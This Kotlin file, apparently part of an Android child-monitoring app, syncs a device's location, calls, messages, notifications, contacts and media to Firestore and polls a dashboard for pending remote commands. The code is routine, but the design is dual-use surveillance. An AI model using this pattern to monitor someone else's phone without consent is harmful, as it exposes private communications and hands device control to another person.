package com.kids.monitor.data

import android.content.Context
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.FirebaseFirestoreSettings
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.firestore.SetOptions
import java.util.UUID

/**
 * جميع مسارات Firestore المستخدمة في التطبيق ولوحة التحكم.
 *
 * users/{uid}/devices/{deviceId}
 * users/{uid}/devices/{deviceId}/{locations|calls|messages|notifications|contacts|media|commands}
 */
object FirestoreSync {

    const val COLLECTION_USERS = "users"
    const val COLLECTION_DEVICES = "devices"

    private var initialized = false

    /** تفعيل التخزين المحلي المؤقت لإعادة الرفع تلقائياً عند عودة الاتصال. */
    @Synchronized
    fun init(context: Context) {
        if (initialized) return
        initialized = true
        val settings = FirebaseFirestoreSettings.Builder()
            .setPersistenceEnabled(true)
            .build()
        db().setFirebaseFirestoreSettings(settings)
    }

    fun db(): FirebaseFirestore = FirebaseFirestore.getInstance()

    fun uid(): String? = FirebaseAuth.getInstance().currentUser?.uid

    /** معرّف ثابت للجهاز يُنشأ مرة واحدة ويُخزَّن محلياً. */
    fun deviceId(context: Context): String {
        val prefs = context.getSharedPreferences("monitor_prefs", Context.MODE_PRIVATE)
        return prefs.getString("device_id", null) ?: UUID.randomUUID().toString().also { id ->
            prefs.edit().putString("device_id", id).apply()
        }
    }

    fun deviceRef(uid: String, deviceId: String) =
        db().collection(COLLECTION_USERS).document(uid)
            .collection(COLLECTION_DEVICES).document(deviceId)

    fun subRef(uid: String, deviceId: String, name: String) =
        deviceRef(uid, deviceId).collection(name)

    /** ربط الجهاز بحساب المستخدم مع بيانات أساسية. */
    fun bindDevice(context: Context, info: Map<String, Any>) {
        val uid = uid() ?: return
        deviceRef(uid, deviceId(context)).set(info, SetOptions.merge())
    }

    fun updateStatus(context: Context, status: Map<String, Any>) {
        val uid = uid() ?: return
        deviceRef(uid, deviceId(context)).set(status, SetOptions.merge())
    }

    fun writeLocation(context: Context, location: Map<String, Any>) {
        val uid = uid() ?: return
        val did = deviceId(context)
        deviceRef(uid, did).set(mapOf("location" to location), SetOptions.merge())
        subRef(uid, did, "locations").add(location)
    }

    fun appendItem(context: Context, collection: String, item: Map<String, Any>) {
        val uid = uid() ?: return
        subRef(uid, deviceId(context), collection).add(item)
    }

    /** الاستماع للأوامر المعلّقة من لوحة التحكم. */
    fun listenCommands(
        context: Context,
        onPending: (commandId: String, data: Map<String, Any>) -> Unit,
    ): ListenerRegistration? {
        val uid = uid() ?: return null
        return subRef(uid, deviceId(context), "commands")
            .whereEqualTo("status", "pending")
            .addSnapshotListener { snapshot, error ->
                if (error != null || snapshot == null) return@addSnapshotListener
                for (doc in snapshot.documents) {
                    val data = doc.data ?: continue
                    onPending(doc.id, data)
                }
            }
    }

    fun setCommandResult(
        context: Context,
        commandId: String,
        status: String,
        result: Map<String, Any>,
    ) {
        val uid = uid() ?: return
        subRef(uid, deviceId(context), "commands").document(commandId).set(
            mapOf(
                "status" to status,
                "result" to result,
                "updatedAt" to com.google.firebase.firestore.FieldValue.serverTimestamp(),
            ),
            SetOptions.merge(),
        )
    }
}
